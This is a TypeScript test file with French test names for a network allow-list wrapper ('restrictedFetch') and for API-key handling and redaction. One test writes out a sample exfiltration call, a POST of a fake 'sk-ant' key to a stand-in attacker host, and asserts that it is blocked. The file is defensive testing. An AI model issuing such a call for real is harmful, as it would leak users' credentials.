import { describe, expect, it } from 'vitest';
import { restrictedFetch } from '../src/runtime/php-network.ts';
import { redactSecrets, secretsFor } from '../src/app/api-key.ts';

describe('restrictedFetch', () => {
	const autorises = () => new Set(['api.anthropic.com', 'api.openai.com']);

	function espion() {
		const appels: Request[] = [];
		const fetch = (async (input: RequestInfo | URL) => {
			appels.push(input as Request);
			return new Response('ok');
		}) as typeof globalThis.fetch;
		return { appels, fetch };
	}

	it('refuse un hôte que l\'environnement ne déclare pas', async () => {
		const { appels, fetch } = espion();
		const restreint = restrictedFetch(fetch, autorises, 'https://apprendre.forelse.fr');
		await expect(restreint('https://attaquant.example/vol', { method: 'POST', body: 'sk-ant-secret' })).rejects.toThrow('attaquant.example');
		await expect(restreint('http://api.openai.com/v1/models')).rejects.toThrow();
		expect(appels).toEqual([]);
	});

	it('laisse passer l\'origine du site (archive, binaire PHP)', async () => {
		const { appels, fetch } = espion();
		await restrictedFetch(fetch, autorises, 'https://apprendre.forelse.fr')('https://apprendre.forelse.fr/envs/symfony-8.zip');
		expect(appels).toHaveLength(1);
	});

	it('lit le corps en entier, sans cookie, et ajoute l\'en-tête qu\'Anthropic exige d\'un navigateur', async () => {
		const { appels, fetch } = espion();
		const flux = new ReadableStream({
			start(controller) {
				controller.enqueue(new TextEncoder().encode('{"model":"claude"}'));
				controller.close();
			},
		});
		const demande = new Request('https://api.anthropic.com/v1/messages', { method: 'POST', body: flux, duplex: 'half' } as RequestInit);
		await restrictedFetch(fetch, autorises, 'https://apprendre.forelse.fr')(demande);
		const envoyee = appels[0];
		expect(envoyee.headers.get('anthropic-dangerous-direct-browser-access')).toBe('true');
		expect(envoyee.credentials).toBe('omit');
		expect(await envoyee.text()).toBe('{"model":"claude"}');
	});
});

describe('clé d\'API', () => {
	it('devient la variable que lit le bridge du fournisseur', () => {
		expect(secretsFor({ provider: 'anthropic', key: 'sk-ant-1' })).toEqual({ ANTHROPIC_API_KEY: 'sk-ant-1' });
		expect(secretsFor({ provider: 'gemini', key: 'g-1' })).toEqual({ GEMINI_API_KEY: 'g-1' });
		expect(secretsFor(null)).toEqual({});
	});

	it('est retirée du texte envoyé au mentor', () => {
		expect(redactSecrets('Erreur : clé sk-ant-123456789 refusée', { ANTHROPIC_API_KEY: 'sk-ant-123456789' })).toBe('Erreur : clé •••• refusée');
	});
});
